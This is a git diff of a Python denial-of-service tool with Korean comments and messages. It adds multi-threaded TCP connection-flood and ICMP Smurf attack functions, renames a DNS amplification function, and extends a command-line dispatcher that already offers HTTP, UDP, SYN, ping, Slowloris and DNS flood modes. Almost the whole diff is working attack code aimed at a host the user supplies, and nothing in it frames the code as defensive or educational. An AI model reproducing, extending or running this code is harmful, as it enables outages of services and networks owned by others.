@@ -169,7 +169,7 @@ def slowloris(host, port, thread_id):
 
 """DRDos 공격 스크립트"""
 # DNS Amplification 공격 함수
-def dns_amplification(host, port, thread_id):
+def udp_dns_amplification(host, port, thread_id):
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -184,11 +184,48 @@ def dns_amplification(host, port, thread_id):
             time.sleep(1)
             continue
 
+
+# TCP 기반 DRDos 공격 함수
+def tcp_drdos(host, port, thread_id):
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((host, int(port)))
+            dummy_data = (f"GET / HTTP/1.1\r\n"
+                          f"Host: {host}\r\n"
+                          "User-Agent: DRDosTCP\r\n"
+                          "Connection: keep-alive\r\n\r\n").encode()
+            s.send(dummy_data)
+            console.print(f"[green][Thread {thread_id}][/green] TCP 패킷 전송됨: {host}:{port}")
+            time.sleep(0.1)
+            s.shutdown(socket.SHUT_RDWR)
+            s.close()
+        except Exception as e:
+            console.print(f"[red][Thread {thread_id}][/red] 오류: {e}")
+            time.sleep(1)
+            continue
+
+# ICMP 기반 DRDos-Smurf 공격 함수
+def icmp_smurf(host, port, thread_id):
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+            # ICMP Echo 요청 패킷 (type=8, code=0)
+            packet = b'\x08\x00\xf7\xff' + b'\x00' * 4
+            s.sendto(packet, (host, 0))
+            console.print(f"[green][Thread {thread_id}][/green] Smurf 패킷 전송됨: {host}")
+            time.sleep(0.1)
+        except Exception as e:
+            console.print(f"[red][Thread {thread_id}][/red] 오류: {e}")
+            time.sleep(1)
+            continue
+
 # 메인 함수
 def main():
     if len(sys.argv) != 4:
         console.print("[red]사용법: python main.py <host> <port> <attack_type>[/red]")
-        console.print("[red]attack_type: http, udp, syn, ping, slowloris, dns[/red]")
+        console.print("[red]attack_type: http, udp, syn, ping, slowloris, dns, tcp, smurf[/red]")
         sys.exit(1)
         
     host = sys.argv[1]
@@ -224,9 +261,15 @@ def main():
         attack_function = slowloris
     elif attack_type == "dns":
         console.print(f"[yellow]{host}:{port}에 대한 DNS Amplification 공격 시작 (스레드 {thread_count}개)[/yellow]")
-        attack_function = dns_amplification
+        attack_function = udp_dns_amplification
+    elif attack_type == "tcp":
+        console.print(f"[yellow]{host}:{port}에 대한 TCP 기반 DRDos 공격 시작 (스레드 {thread_count}개)[/yellow]")
+        attack_function = tcp_drdos
+    elif attack_type == "smurf":
+        console.print(f"[yellow]{host}:{port}에 대한 ICMP Smurf 공격 시작 (스레드 {thread_count}개)[/yellow]")
+        attack_function = icmp_smurf
     else:
-        console.print("[red]유효하지 않은 attack_type입니다. http, udp, syn, ping, slowloris, dns 중 하나를 선택하세요.[/red]")
+        console.print("[red]유효하지 않은 attack_type입니다. http, udp, syn, ping, slowloris, dns, tcp, smurf 중 하나를 선택하세요.[/red]")
         sys.exit(1)
     
     # 스레드 생성 및 시작
